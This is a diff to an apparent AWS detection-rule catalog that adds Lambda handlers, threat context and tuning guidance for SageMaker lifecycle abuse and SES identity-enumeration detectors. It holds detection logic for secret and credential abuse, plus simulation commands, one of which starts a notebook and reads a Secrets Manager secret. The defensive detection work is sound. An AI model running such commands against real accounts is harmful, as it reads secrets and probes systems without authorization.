+        realWorldUsage: "This pattern is practical because startup scripts can prepare a notebook environment and then immediately leverage the notebook's cloud permissions for follow-on abuse.",
+        whyItMatters: "The strongest signal is the ordered chain from SageMaker startup path to later sensitive API use, not either side alone.",
+        riskAndImpact: "If missed, defenders may not connect notebook startup manipulation with the cloud credential or data-access activity that followed it.",
+      },
+      telemetryValidation: {
+        requiredLogSources: ["AWS CloudTrail management events for SageMaker", "AWS CloudTrail management events for Secrets Manager, KMS, STS, IAM, and related services"],
+        requiredFields: ["eventSource", "eventName", "eventTime", "userIdentity.arn", "userIdentity.sessionContext.sessionIssuer.arn", "requestParameters.notebookInstanceName", "sourceIPAddress"],
+        loggingRequirements: ["SageMaker lifecycle-path events and follow-on sensitive API events must be ingested into the same analytics environment.", "The detector should normalize direct actor identity and notebook execution-role identity.", "Notebook execution-role resolution should be available for downstream attribution."],
+        limitations: ["CloudTrail does not show the commands executed inside the notebook.", "Actor-only joins may miss execution-role pivots unless role attribution is enriched.", "Some legitimate notebooks routinely access secrets or S3 after startup."],
+      },
+      dataModeling: {
+        rawToNormalized: [
+          { rawPath: "userIdentity.arn", normalizedPath: "user.arn", notes: "Operator who prepared or started the notebook" },
+          { rawPath: "requestParameters.notebookInstanceName", normalizedPath: "aws.sagemaker.notebook.name", notes: "Notebook involved in the lifecycle path" },
+          { rawPath: "follow_on.eventName", normalizedPath: "related.event.action", notes: "Sensitive action after notebook preparation or start" },
+          { rawPath: "enrichment.executionRoleArn", normalizedPath: "aws.sagemaker.notebook.execution_role.arn", notes: "Resolved notebook execution role where available" },
+        ],
+        exampleNormalizedEvent: JSON.stringify({
+          "@timestamp": "2025-02-10T12:45:00Z",
+          event: { category: ["configuration"], type: ["change"], action: "StartNotebookInstance", outcome: "success", provider: "aws" },
+          user: { arn: "arn:aws:iam::123456789012:user/dev", type: "IAMUser" },
+          aws: { sagemaker: { notebook: { name: "target", execution_role: { arn: "arn:aws:iam::123456789012:role/SageMakerExecRole" } } } },
+          related: { event: { action: "GetSecretValue" } },
+        }, null, 2),
+      },
+      enrichment: [
+        { dimension: "Execution Role Attribution", description: "Resolve which IAM role the notebook runs as after start.", examples: ["SageMakerExecRole with Secrets Manager access"], falsePositiveReduction: "Improves correlation from notebook startup into later API activity." },
+        { dimension: "Notebook Sensitivity", description: "Classify the notebook by business function, data sensitivity, and environment.", examples: ["prod feature notebook", "sandbox experiment"], falsePositiveReduction: "Raises urgency when startup abuse affects high-value notebooks." },
+        { dimension: "Follow-On Activity Class", description: "Group later actions into secrets access, role chaining, IAM mutation, or other abuse classes.", examples: ["GetSecretValue", "AssumeRole", "AttachRolePolicy"], falsePositiveReduction: "Makes the post-start abuse path easier to triage." },
+      ],
+      logicExplanation: {
+        humanReadable: "This rule should model a short-window post-start SageMaker abuse sequence: a notebook is updated or started along a lifecycle-config path, and then sensitive cloud activity occurs from the same operator identity or the notebook's execution role. It should require event order and stable identity mapping.",
+        conditions: ["first eventSource equals sagemaker.amazonaws.com and eventName equals UpdateNotebookInstance or StartNotebookInstance", "second event is a sensitive cloud API by the same normalized operator identity or the resolved notebook execution role", "follow-on activity occurs within 30 minutes"],
+        tuningGuidance: "1. Require event order. 2. Map notebooks to execution roles. 3. Escalate further when the actor is unauthorized for SageMaker lifecycle management or the notebook is sensitive.",
+        whenToFire: "Fire when a SageMaker lifecycle path is followed quickly by sensitive cloud activity from the same operator or notebook execution role.",
+      },
+      simulationCommand: "aws sagemaker start-notebook-instance --notebook-instance-name target && aws secretsmanager get-secret-value --secret-id ExampleSecret",
+      quality: {
+        signalQuality: 9,
+        falsePositiveRate: "Low-Medium depending on notebook workloads and execution-role modeling",
+        expectedVolume: "Very low",
+        productionReadiness: "validated",
+      },
+      communityConfidence: { accurate: 0, needsTuning: 0, noisy: 0 },
+      deployment: {
+        whereItRuns: ["SIEM correlation engines", "Athena with ordered event windows", "Panther / Chronicle / Datadog", "EventBridge + Lambda with temporary state"],
+        scheduling: "Near-real-time is preferred because post-start abuse may happen quickly.",
+        considerations: ["This is the strongest SageMaker lifecycle abuse detector in the set.", "Execution-role attribution is the main implementation dependency."],
+      },
+    },
   },
 
   // --- SES Identity Enumeration ---
   {
     id: "det-106",
     title: "SES Identity Enumeration Visibility",
-    description: "Baseline visibility for SES identity listing or verification-attribute retrieval. These are reconnaissance-style read APIs; use Medium if SES is rare in the environment.",
+    description: "Baseline visibility for SES identity-listing and verification-attribute retrieval. These are reconnaissance-style read APIs that can reveal which email identities and domains are available for later abuse or policy manipulation.",
     awsService: "SES",
     relatedServices: [],
     severity: "Medium",
@@ -12776,16 +13902,95 @@ ORDER BY eventTime DESC`,
 | filter eventName in ["ListIdentities", "GetIdentityVerificationAttributes"]
 | sort @timestamp desc`,
       eventbridge: JSON.stringify({ source: ["aws.ses"], "detail-type": ["AWS API Call via CloudTrail"], detail: { eventSource: ["ses.amazonaws.com"], eventName: ["ListIdentities", "GetIdentityVerificationAttributes"] } }, null, 2),
+      lambda: `"""
+SES Identity Enumeration Visibility
+Trigger: EventBridge rule matching SES identity-enumeration APIs.
+Use for: Baseline visibility into SES reconnaissance-style reads.
+"""
+
+def lambda_handler(event, context):
+    detail = event.get("detail", {})
+    if detail.get("eventSource") != "ses.amazonaws.com":
+        return {"matched": False}
+    if detail.get("eventName") not in {"ListIdentities", "GetIdentityVerificationAttributes"}:
+        return {"matched": False}
+
+    return {
+        "matched": True,
+        "alert": {
+            "rule_id": "det-106",
+            "title": "SES Identity Enumeration Visibility",
+            "severity": "Medium",
+            "actor": detail.get("userIdentity", {}).get("arn"),
+            "event_name": detail.get("eventName"),
+            "event_time": detail.get("eventTime"),
+        },
+    }
+`,
     },
     relatedAttackSlugs: [],
     telemetry: { primaryLogSource: "AWS CloudTrail", generatingService: "ses.amazonaws.com", importantFields: ["eventSource", "eventName", "userIdentity.arn", "requestParameters.identityType", "requestParameters.identities", "sourceIPAddress", "eventTime"], exampleEvent: JSON.stringify({ eventVersion: "1.08", eventSource: "ses.amazonaws.com", eventName: "ListIdentities", userIdentity: { type: "IAMUser", arn: "arn:aws:iam::123456789012:user/admin" }, requestParameters: { identityType: "EmailAddress" }, sourceIPAddress: "203.0.113.10", eventTime: "2025-02-10T12:45:00Z" }, null, 2) },
-    investigationSteps: ["Identify the actor and enumeration scope.", "Verify if enumeration was authorized.", "Check for burst or follow-on SES abuse."],
-    testingSteps: ["Call ListIdentities or GetIdentityVerificationAttributes.", "Verify CloudTrail captures the event.", "Run the detection."],
+    investigationSteps: ["Identify the actor, request type, and whether the enumeration was broad or narrowly targeted.", "Verify whether the identity has a legitimate reason to inspect SES identities or verification state.", "Check for burst enumeration, follow-on SES policy changes, or credential-oriented abuse after the read activity."],
+    testingSteps: ["Call `ListIdentities` or `GetIdentityVerificationAttributes` in a test SES environment.", "Verify CloudTrail captures the request and actor context.", "Run the baseline detector and confirm it records all SES identity-enumeration reads without name-based suppression."],
+    lifecycle: {
+      whyItMatters: "SES identity enumeration is often the first step in understanding how SES is configured and which email identities are available for later abuse. Even a benign read can become meaningful when SES usage is rare or tightly controlled.",
+      threatContext: {
+        attackerBehavior: "An attacker may enumerate verified SES identities and their verification state to identify targets for phishing, identity policy abuse, or SES infrastructure misuse.",
+        realWorldUsage: "These APIs are attractive because they provide low-noise reconnaissance about the email-sending surface available in the account.",
+        whyItMatters: "This baseline event feeds stronger detections about burst reconnaissance, unauthorized actors, and recon-to-action transitions.",
+        riskAndImpact: "If missed, defenders may overlook early SES reconnaissance that precedes policy abuse, credential theft, or outbound messaging misuse.",
+      },
+      telemetryValidation: {
+        requiredLogSources: ["AWS CloudTrail management events for SES"],
+        requiredFields: ["eventSource", "eventName", "eventTime", "userIdentity.arn", "requestParameters.identityType", "requestParameters.identities", "sourceIPAddress"],
+        loggingRequirements: ["CloudTrail must ingest SES management events.", "The environment should retain actor and enumeration-scope context.", "Follow-on SES write APIs should be available for downstream correlation."],
+        limitations: ["A single read event does not prove malicious intent.", "Legitimate email administrators and automation may call these APIs routinely.", "Identity enumeration may be low-volume and easy to miss without baseline visibility."],
+      },
+      dataModeling: {
+        rawToNormalized: [
+          { rawPath: "userIdentity.arn", normalizedPath: "user.arn", notes: "Actor enumerating SES identities" },
+          { rawPath: "eventName", normalizedPath: "event.action", notes: "Enumeration API used" },
+          { rawPath: "requestParameters.identityType", normalizedPath: "aws.ses.identity.type", notes: "SES identity category requested where available" },
+          { rawPath: "requestParameters.identities", normalizedPath: "aws.ses.identity.requested_values", notes: "Specific identities queried where available" },
+        ],
+        exampleNormalizedEvent: JSON.stringify({
+          "@timestamp": "2025-02-10T12:45:00Z",
+          event: { category: ["discovery"], type: ["info"], action: "ListIdentities", outcome: "success", provider: "aws" },
+          user: { arn: "arn:aws:iam::123456789012:user/admin", type: "IAMUser" },
+          aws: { ses: { identity: { type: "EmailAddress" } } },
+          source: { ip: "203.0.113.10" },
+        }, null, 2),
+      },
+      enrichment: [
+        { dimension: "SES Usage Context", description: "Determine whether SES is actively used and by which teams or automations.", examples: ["marketing email service", "SES unused in this account"], falsePositiveReduction: "Makes enumeration more suspicious when SES is rare or dormant." },
+        { dimension: "Actor Authorization", description: "Understand whether the actor normally manages SES identities or email infrastructure.", examples: ["email admin", "unexpected app role"], falsePositiveReduction: "Turns baseline visibility into stronger actor-based detections." },
+        { dimension: "Enumeration Scope", description: "Assess whether the request was narrow and expected or broad and exploratory.", examples: ["single domain check", "large identity sweep"], falsePositiveReduction: "Improves triage for likely reconnaissance." },
+      ],
+      logicExplanation: {
+        humanReadable: "This should remain a broad visibility rule for successful SES identity-enumeration reads. It records who inspected SES identities or verification state so stronger burst, actor, and recon-to-action detections have a clean baseline.",
+        conditions: ["eventSource equals ses.amazonaws.com", "eventName equals ListIdentities or GetIdentityVerificationAttributes", "errorCode is absent"],
+        tuningGuidance: "1. Keep this baseline broad. 2. Resolve whether SES is commonly used in the environment. 3. Correlate with burst behavior, unauthorized actors, or later SES write activity for higher-confidence detections.",
+        whenToFire: "Fire on every successful SES identity-enumeration event for visibility.",
+      },
+      simulationCommand: "aws ses list-identities --identity-type EmailAddress",
+      quality: {
+        signalQuality: 5,
+        falsePositiveRate: "Medium as a baseline visibility rule, low-medium when SES is rare or actor context is strong",
+        expectedVolume: "Low",
+        productionReadiness: "validated",
+      },
+      communityConfidence: { accurate: 0, needsTuning: 0, noisy: 0 },
+      deployment: {
+        whereItRuns: ["EventBridge + Lambda", "Athena", "Splunk", "Panther / Chronicle / Datadog"],
+        scheduling: "Real-time is useful for chaining into follow-on SES abuse detections, but scheduled analysis is also acceptable.",
+        considerations: ["This is the feeder rule for the SES reconnaissance family.", "SES usage patterns are the main enrichment dependency."],
+      },
+    },
   },
   {
     id: "det-107",
     title: "Burst SES Identity Enumeration",
-    description: "Detects unusual enumeration volume or burst behavior. Reconnaissance often appears as rapid repeated list/get calls rather than a single read. Threshold on repeated enumeration by same actor within a short time window.",
+    description: "Detects rapid or repeated SES identity enumeration. Reconnaissance often appears as a short-window burst of list and verification-attribute calls rather than a single isolated read.",
     awsService: "SES",
     relatedServices: [],
     severity: "High",
@@ -12831,16 +14036,93 @@ ORDER BY cnt DESC`,
 | filter cnt > 5
 | sort cnt desc`,
       eventbridge: JSON.stringify({ source: ["aws.ses"], "detail-type": ["AWS API Call via CloudTrail"], detail: { eventSource: ["ses.amazonaws.com"], eventName: ["ListIdentities", "GetIdentityVerificationAttributes"] } }, null, 2),
+      lambda: `"""
+Burst SES Identity Enumeration
+Trigger: EventBridge rule matching SES identity-enumeration APIs.
+Use for: Threshold-based burst detection on SES reconnaissance activity.
+"""
+
+def lambda_handler(event, context):
+    detail = event.get("detail", {})
+    if detail.get("eventSource") != "ses.amazonaws.com":
+        return {"matched": False}
+    if detail.get("eventName") not in {"ListIdentities", "GetIdentityVerificationAttributes"}:
+        return {"matched": False}
+
+    return {
+        "matched": "requires-5-minute-enumeration-threshold-check",
+        "alert": {
+            "rule_id": "det-107",
+            "title": "Burst SES Identity Enumeration",
+            "severity": "High",
+            "actor": detail.get("userIdentity", {}).get("arn"),
+            "event_name": detail.get("eventName"),
+            "event_time": detail.get("eventTime"),
+        },
+    }
+`,
     },
     relatedAttackSlugs: [],
     telemetry: { primaryLogSource: "AWS CloudTrail", generatingService: "ses.amazonaws.com", importantFields: ["eventSource", "eventName", "userIdentity.arn", "eventTime"], exampleEvent: JSON.stringify({ eventVersion: "1.08", eventSource: "ses.amazonaws.com", eventName: "GetIdentityVerificationAttributes", userIdentity: { type: "IAMUser", arn: "arn:aws:iam::123456789012:user/attacker" }, requestParameters: { identities: ["user1@domain.com", "user2@domain.com"] }, sourceIPAddress: "203.0.113.10", eventTime: "2025-02-10T12:45:00Z" }, null, 2) },
-    investigationSteps: ["Identify the actor and enumeration volume.", "Verify if burst was authorized.", "Check for follow-on SES or identity abuse."],
-    testingSteps: ["Call GetIdentityVerificationAttributes repeatedly (>5 in 5 min).", "Run Splunk or Athena threshold query."],
+    investigationSteps: ["Identify the actor, call count, and exact enumeration window.", "Verify whether burst activity matches expected synchronization or SES administration workflows.", "Check for follow-on SES policy changes, identity verification actions, or credential-related abuse."],
+    testingSteps: ["Invoke `GetIdentityVerificationAttributes` or `ListIdentities` repeatedly more than five times within five minutes.", "Verify CloudTrail records the burst of requests.", "Run the threshold detector and confirm it keys on short-window volume rather than a single event."],
+    lifecycle: {
+      whyItMatters: "Reconnaissance is often more visible in volume than in any one read API. Burst SES identity enumeration can indicate active mapping of email infrastructure before abuse.",
+      threatContext: {
+        attackerBehavior: "An attacker may repeatedly query SES identities and verification status to inventory usable domains and email addresses quickly.",
+        realWorldUsage: "This is attractive because the reconnaissance is cheap, fast, and can provide a complete picture of the SES footprint before policy changes or sending abuse.",
+        whyItMatters: "Short-window repetition is often the strongest sign that the activity is exploratory rather than a normal administrative spot check.",
+        riskAndImpact: "If missed, defenders may not recognize an active reconnaissance phase that precedes SES misconfiguration or phishing activity.",
+      },
+      telemetryValidation: {
+        requiredLogSources: ["AWS CloudTrail management events for SES"],
+        requiredFields: ["eventSource", "eventName", "eventTime", "userIdentity.arn", "userIdentity.sessionContext.sessionIssuer.arn", "sourceIPAddress"],
+        loggingRequirements: ["SES enumeration events must be ingested with accurate timestamps.", "The detection engine must support thresholding or windowed aggregation.", "Actor identity should be normalized across IAM users and assumed roles."],
+        limitations: ["Fixed thresholds may need tuning by environment.", "Legitimate automation may burst during synchronization or audits.", "Some recon may remain low-and-slow and avoid threshold-based detection."],
+      },
+      dataModeling: {
+        rawToNormalized: [
+          { rawPath: "userIdentity.arn", normalizedPath: "user.arn", notes: "Actor performing repeated SES reads" },
+          { rawPath: "eventName", normalizedPath: "event.action", notes: "Enumeration API counted in the burst" },
+          { rawPath: "eventTime", normalizedPath: "@timestamp", notes: "Time of each SES read event" },
+        ],
+        exampleNormalizedEvent: JSON.stringify({
+          "@timestamp": "2025-02-10T12:45:00Z",
+          event: { category: ["discovery"], type: ["info"], action: "GetIdentityVerificationAttributes", outcome: "success", provider: "aws" },
+          user: { arn: "arn:aws:iam::123456789012:user/attacker", type: "IAMUser" },
+          source: { ip: "203.0.113.10" },
+        }, null, 2),
+      },
+      enrichment: [
+        { dimension: "Actor History", description: "Determine whether the actor has previously performed SES enumeration and at what volume.", examples: ["first-time SES enumeration", "daily SES sync role"], falsePositiveReduction: "Makes burst behavior more meaningful in context." },
+        { dimension: "SES Operational Windows", description: "Understand whether the burst aligns with expected maintenance or sync jobs.", examples: ["nightly inventory job", "ad hoc burst at unusual hour"], falsePositiveReduction: "Separates legitimate automation from exploratory recon." },
+        { dimension: "Post-Burst Activity", description: "Track whether the same actor moves into SES write actions or other abuse shortly afterward.", examples: ["PutIdentityPolicy after burst", "CreateAccessKey after burst"], falsePositiveReduction: "Improves confidence when the burst leads to action." },
+      ],
+      logicExplanation: {
+        humanReadable: "This rule should detect short-window spikes in SES identity-enumeration activity. It should count `ListIdentities` and `GetIdentityVerificationAttributes` calls per normalized actor and fire when the number of calls exceeds the local threshold inside a five-minute window.",
+        conditions: ["eventSource equals ses.amazonaws.com", "eventName equals ListIdentities or GetIdentityVerificationAttributes", "same normalized actor exceeds threshold in a 5-minute window"],
+        tuningGuidance: "1. Tune the threshold to local SES usage. 2. Normalize IAM users and assumed roles into a stable actor identity. 3. Escalate further when the burst is performed by an unauthorized actor or followed by SES write activity.",
+        whenToFire: "Fire when SES identity-enumeration volume exceeds the configured threshold in a short time window.",
+      },
+      simulationCommand: "for i in {1..6}; do aws ses get-identity-verification-attributes --identities user@example.com; done",
+      quality: {
+        signalQuality: 7,
+        falsePositiveRate: "Low-Medium with tuned thresholds and actor baselines",
+        expectedVolume: "Very low",
+        productionReadiness: "validated",
+      },
+      communityConfidence: { accurate: 0, needsTuning: 0, noisy: 0 },
+      deployment: {
+        whereItRuns: ["SIEM threshold engines", "Athena scheduled aggregation", "CloudWatch Logs Insights", "Panther / Chronicle / Datadog"],
+        scheduling: "Near-real-time or short scheduled windows work well because the burst itself is the signal.",
+        considerations: ["This is the volume-based SES reconnaissance detector.", "Threshold tuning is the main implementation dependency."],
+      },
+    },
   },
   {
     id: "det-108",
-    title: "SES Identity Enumeration by Unexpected Actor",
-    description: "Detects SES reconnaissance by identities that normally should not interact with SES identity-management APIs. Suspicious: IAM users outside messaging/email admin, application roles that do not manage SES, compromised compute roles.",
+    title: "SES Identity Enumeration Outside Authorized Messaging Path",
+    description: "Detects SES identity-enumeration activity by identities outside approved messaging, email, or platform workflows. This should rely on explicit actor authorization rather than role-name substring allowlists.",
     awsService: "SES",
     relatedServices: [],
     severity: "High",
@@ -12858,44 +14140,108 @@ detection:
     eventName:
       - ListIdentities
       - GetIdentityVerificationAttributes
-  filter_known:
-    userIdentity.arn|contains:
-      - '/role/SES'
-      - '/role/Email'
-      - '/role/Messaging'
-      - '/role/Admin'
-      - '/user/ses'
-  condition: selection and not filter_known
+  condition: selection
 level: high`,
       splunk: `index=aws sourcetype=aws:cloudtrail eventSource=ses.amazonaws.com (eventName=ListIdentities OR eventName=GetIdentityVerificationAttributes)
-| where NOT (like(userIdentity.arn, "%/role/SES%") OR like(userIdentity.arn, "%/role/Email%") OR like(userIdentity.arn, "%/role/Messaging%") OR like(userIdentity.arn, "%/role/Admin%") OR like(userIdentity.arn, "%/user/ses%"))
 | table _time, userIdentity.type, userIdentity.arn, userIdentity.sessionContext.sessionIssuer.arn, eventName, sourceIPAddress`,
       cloudtrail: `SELECT eventTime, userIdentity.type, userIdentity.arn, userIdentity.sessionContext.sessionIssuer.arn, eventName, sourceIPAddress
 FROM cloudtrail_logs
 WHERE eventSource = 'ses.amazonaws.com'
   AND eventName IN ('ListIdentities', 'GetIdentityVerificationAttributes')
-  AND userIdentity.arn NOT LIKE '%/role/SES%'
-  AND userIdentity.arn NOT LIKE '%/role/Email%'
-  AND userIdentity.arn NOT LIKE '%/role/Messaging%'
-  AND userIdentity.arn NOT LIKE '%/role/Admin%'
-  AND userIdentity.arn NOT LIKE '%/user/ses%'
 ORDER BY eventTime DESC`,
       cloudwatch: `fields @timestamp, userIdentity.type, userIdentity.arn, userIdentity.sessionContext.sessionIssuer.arn, eventName, sourceIPAddress
 | filter eventSource = "ses.amazonaws.com"
 | filter eventName in ["ListIdentities", "GetIdentityVerificationAttributes"]
-| filter userIdentity.arn not like /\\/role\\/(SES|Email|Messaging|Admin)/ and userIdentity.arn not like /\\/user\\/ses/
 | sort @timestamp desc`,
       eventbridge: JSON.stringify({ source: ["aws.ses"], "detail-type": ["AWS API Call via CloudTrail"], detail: { eventSource: ["ses.amazonaws.com"], eventName: ["ListIdentities", "GetIdentityVerificationAttributes"] } }, null, 2),
+      lambda: `"""
+SES Identity Enumeration Outside Authorized Messaging Path
+Trigger: EventBridge rule matching SES identity-enumeration APIs.
+Use for: Real-time authorization checks on SES reconnaissance activity.
+"""
+
+def lambda_handler(event, context):
+    detail = event.get("detail", {})
+    if detail.get("eventSource") != "ses.amazonaws.com":
+        return {"matched": False}
+    if detail.get("eventName") not in {"ListIdentities", "GetIdentityVerificationAttributes"}:
+        return {"matched": False}
+
+    return {
+        "matched": "requires-authorized-ses-identity-reader-check",
+        "alert": {
+            "rule_id": "det-108",
+            "title": "SES Identity Enumeration Outside Authorized Messaging Path",
+            "severity": "High",
+            "actor": detail.get("userIdentity", {}).get("arn"),
+            "event_name": detail.get("eventName"),
+            "event_time": detail.get("eventTime"),
+        },
+    }
+`,
     },
     relatedAttackSlugs: [],
     telemetry: { primaryLogSource: "AWS CloudTrail", generatingService: "ses.amazonaws.com", importantFields: ["eventSource", "eventName", "userIdentity.type", "userIdentity.arn", "userIdentity.sessionContext.sessionIssuer.arn", "sourceIPAddress", "eventTime"], exampleEvent: JSON.stringify({ eventVersion: "1.08", eventSource: "ses.amazonaws.com", eventName: "ListIdentities", userIdentity: { type: "AssumedRole", arn: "arn:aws:sts::123456789012:assumed-role/AppRole/session" }, requestParameters: { identityType: "EmailAddress" }, sourceIPAddress: "203.0.113.10", eventTime: "2025-02-10T12:45:00Z" }, null, 2) },
-    investigationSteps: ["Identify the actor type and ARN.", "Verify if this identity is authorized for SES identity management.", "Update allowlist if legitimate."],
-    testingSteps: ["As a non-SES role, call ListIdentities.", "Verify detection triggers."],
+    investigationSteps: ["Identify the actor, session issuer, and source IP behind the SES enumeration request.", "Verify whether this identity is approved to inspect SES identities or verification state.", "Determine whether the request came from trusted messaging automation or an unexpected application or workload principal."],
+    testingSteps: ["As an identity outside the approved SES or messaging set, call `ListIdentities` or `GetIdentityVerificationAttributes`.", "Verify CloudTrail captures the actor context.", "Run the detector and confirm it relies on explicit actor authorization instead of role-name text matching."],
+    lifecycle: {
+      whyItMatters: "Only a limited set of identities should routinely inspect SES identity state. When an unapproved actor performs this reconnaissance, the event is a strong signal of cloud email-surface exploration.",
+      threatContext: {
+        attackerBehavior: "An attacker operating through a compromised app role, IAM user, or compute role may query SES identities to understand email infrastructure and potential abuse paths.",
+        realWorldUsage: "This is attractive because SES enumeration is lightweight and often overlooked in environments where email services are managed by a small set of teams.",
+        whyItMatters: "Authorization context matters more than whether an actor's ARN happens to contain Email or SES-like text.",
+        riskAndImpact: "If missed, unauthorized actors can map the SES surface before moving to policy changes, phishing, or credential-oriented abuse.",
+      },
+      telemetryValidation: {
+        requiredLogSources: ["AWS CloudTrail management events for SES", "Authorized messaging and SES principal inventory"],
+        requiredFields: ["eventSource", "eventName", "eventTime", "userIdentity.type", "userIdentity.arn", "userIdentity.sessionContext.sessionIssuer.arn", "sourceIPAddress"],
+        loggingRequirements: ["SES enumeration events must be ingested with full actor context.", "The environment should maintain exact principals allowed to manage or inspect SES identities.", "Actor-to-environment or account scope should be modeled where relevant."],
+        limitations: ["Without actor inventories this rule becomes a weaker anomaly detector.", "Some legitimate automation may perform SES reads under generic-looking roles.", "A single unauthorized read still needs context for prioritization."],
+      },
+      dataModeling: {
+        rawToNormalized: [
+          { rawPath: "userIdentity.arn", normalizedPath: "user.arn", notes: "Actor performing SES identity reconnaissance" },
+          { rawPath: "userIdentity.sessionContext.sessionIssuer.arn", normalizedPath: "aws.identity.session_issuer.arn", notes: "Underlying role where relevant" },
+          { rawPath: "eventName", normalizedPath: "event.action", notes: "SES enumeration action performed" },
+          { rawPath: "sourceIPAddress", normalizedPath: "source.ip", notes: "Originating source IP of the request" },
+        ],
+        exampleNormalizedEvent: JSON.stringify({
+          "@timestamp": "2025-02-10T12:45:00Z",
+          event: { category: ["discovery"], type: ["info"], action: "ListIdentities", outcome: "success", provider: "aws" },
+          user: { arn: "arn:aws:sts::123456789012:assumed-role/AppRole/session", type: "AssumedRole" },
+          source: { ip: "203.0.113.10" },
+        }, null, 2),
+      },
+      enrichment: [
+        { dimension: "Authorized SES Readers", description: "Exact inventory of identities allowed to inspect SES identities and verification status.", examples: ["email admin role", "approved SES automation"], falsePositiveReduction: "Replaces brittle SES role-name allowlists." },
+        { dimension: "Workflow Provenance", description: "Determine whether the read came from trusted messaging automation, monitoring, or manual ad hoc access.", examples: ["monitoring lambda", "manual unknown session"], falsePositiveReduction: "Separates expected operational reads from suspicious reconnaissance." },
+        { dimension: "SES Scope Relevance", description: "Understand whether the actor normally works with SES in this account or environment.", examples: ["marketing email account", "account where SES is unused"], falsePositiveReduction: "Raises suspicion when the actor has no business touching SES." },
+      ],
+      logicExplanation: {
+        humanReadable: "This rule should detect SES identity-enumeration activity outside approved messaging workflows. It should match `ListIdentities` and `GetIdentityVerificationAttributes`, resolve the actor and workflow provenance, and then check whether that identity is explicitly allowed to inspect SES identity state.",
+        conditions: ["eventSource equals ses.amazonaws.com", "eventName equals ListIdentities or GetIdentityVerificationAttributes", "actor is not in the approved SES-reader inventory or request lacks approved workflow provenance"],
+        tuningGuidance: "1. Use exact actor inventories. 2. Model messaging automation as explicit approved paths. 3. Escalate when SES is rare in the account or the same actor later performs SES write actions.",
+        whenToFire: "Fire when SES identity enumeration is performed by an identity outside approved messaging or platform workflows.",
+      },
+      simulationCommand: "aws ses list-identities --identity-type EmailAddress --profile dev-user",
+      quality: {
+        signalQuality: 8,
+        falsePositiveRate: "Low-Medium with actor inventories and messaging workflow context; high with role-name heuristics",
+        expectedVolume: "Low",
+        productionReadiness: "validated",
+      },
+      communityConfidence: { accurate: 0, needsTuning: 0, noisy: 0 },
+      deployment: {
+        whereItRuns: ["EventBridge + Lambda enrichment", "Athena with actor inventories", "Splunk", "Panther / Chronicle / Datadog"],
+        scheduling: "Real-time is useful because unauthorized SES reconnaissance may quickly lead to write activity.",
+        considerations: ["This is the actor-centric SES reconnaissance detector.", "Actor inventory and messaging workflow provenance are the main dependencies."],
+      },
+    },
   },
   {
     id: "det-109",
     title: "SES Enumeration Followed by SES or Credential Abuse",
-    description: "High-confidence recon-to-action: ListIdentities/GetIdentityVerificationAttributes then shortly afterward same actor performs SES identity/policy changes, IAM CreateAccessKey, or other follow-on abuse.",
+    description: "High-confidence recon-to-action detection for SES. This should correlate SES identity enumeration with later SES write activity or credential-related abuse from the same operator identity using ordered sequence, not loose co-occurrence.",
     awsService: "SES",
     relatedServices: ["IAM"],
     severity: "Critical",
@@ -12921,9 +14267,9 @@ detection:
       - VerifyEmailIdentity
   selection_iam:
     eventName: CreateAccessKey
-  condition: 1 of selection_*
+  condition: selection_enum
 level: critical
-# Full correlation (actor, 30 min) requires SIEM.`,
+# Full correlation requires ordered sequence and stable actor identity across SES reconnaissance and follow-on abuse.`,
       splunk: `index=aws sourcetype=aws:cloudtrail
   ((eventSource=ses.amazonaws.com AND eventName IN ("ListIdentities","GetIdentityVerificationAttributes")) OR (eventSource=ses.amazonaws.com AND eventName IN ("PutIdentityPolicy","SetIdentityNotificationTopic","VerifyEmailIdentity")) OR eventName="CreateAccessKey")
 | eval actor=coalesce(userIdentity.arn, userIdentity.sessionContext.sessionIssuer.arn)
@@ -12958,11 +14304,90 @@ ORDER BY e.enum_time DESC`,
 | filter cnt > 1
 | sort cnt desc`,
       eventbridge: JSON.stringify({ source: ["aws.ses"], "detail-type": ["AWS API Call via CloudTrail"], detail: { eventSource: ["ses.amazonaws.com"], eventName: ["ListIdentities", "GetIdentityVerificationAttributes"] } }, null, 2),
+      lambda: `"""
+SES Enumeration Followed by SES or Credential Abuse
+Trigger: EventBridge rule matching SES identity-enumeration APIs.
+Use for: Correlation from SES reconnaissance to later write or credential abuse.
+"""
+
+def lambda_handler(event, context):
+    detail = event.get("detail", {})
+    if detail.get("eventSource") != "ses.amazonaws.com":
+        return {"matched": False}
+    if detail.get("eventName") not in {"ListIdentities", "GetIdentityVerificationAttributes"}:
+        return {"matched": False}
+
+    return {
+        "matched": "requires-ses-recon-plus-abuse-correlation",
+        "alert": {
+            "rule_id": "det-109",
+            "title": "SES Enumeration Followed by SES or Credential Abuse",
+            "severity": "Critical",
+            "actor": detail.get("userIdentity", {}).get("arn"),
+            "event_name": detail.get("eventName"),
+            "event_time": detail.get("eventTime"),
+        },
+    }
+`,
     },
     relatedAttackSlugs: [],
     telemetry: { primaryLogSource: "AWS CloudTrail", generatingService: "ses.amazonaws.com", importantFields: ["eventSource", "eventName", "userIdentity.arn", "eventTime"], exampleEvent: JSON.stringify({ eventVersion: "1.08", eventSource: "ses.amazonaws.com", eventName: "ListIdentities", userIdentity: { type: "IAMUser", arn: "arn:aws:iam::123456789012:user/attacker" }, requestParameters: { identityType: "EmailAddress" }, sourceIPAddress: "203.0.113.10", eventTime: "2025-02-10T12:45:00Z" }, null, 2) },
-    investigationSteps: ["Identify enumeration and follow-on abuse sequence.", "Verify if abuse was authorized.", "Check for phishing or credential theft indicators."],
-    testingSteps: ["Call ListIdentities, then PutIdentityPolicy or CreateAccessKey within 30 min.", "Run Splunk or Athena correlation query."],
+    investigationSteps: ["Identify the SES enumeration event, exact follow-on abuse action, and operator identity linking both stages.", "Verify whether the write or credential action was expected after the reconnaissance step.", "Check for indicators of phishing setup, SES policy abuse, or identity compromise."],
+    testingSteps: ["Call `ListIdentities` or `GetIdentityVerificationAttributes`, then perform `PutIdentityPolicy`, `SetIdentityNotificationTopic`, `VerifyEmailIdentity`, or `CreateAccessKey` within 30 minutes.", "Verify both the reconnaissance and follow-on abuse events appear in CloudTrail.", "Run the detector and confirm it requires ordered sequence rather than simple grouping on actor names."],
+    lifecycle: {
+      whyItMatters: "Reconnaissance followed by action is one of the clearest behavioral patterns in cloud abuse. In SES, enumeration that quickly turns into policy changes or credential creation is a strong signal of malicious intent.",
+      threatContext: {
+        attackerBehavior: "An attacker may enumerate SES identities and then move directly into SES policy manipulation, notification changes, identity verification abuse, or credential-oriented actions that support outbound abuse.",
+        realWorldUsage: "This is practical because the reconnaissance reveals the SES landscape and the follow-on action operationalizes that knowledge quickly.",
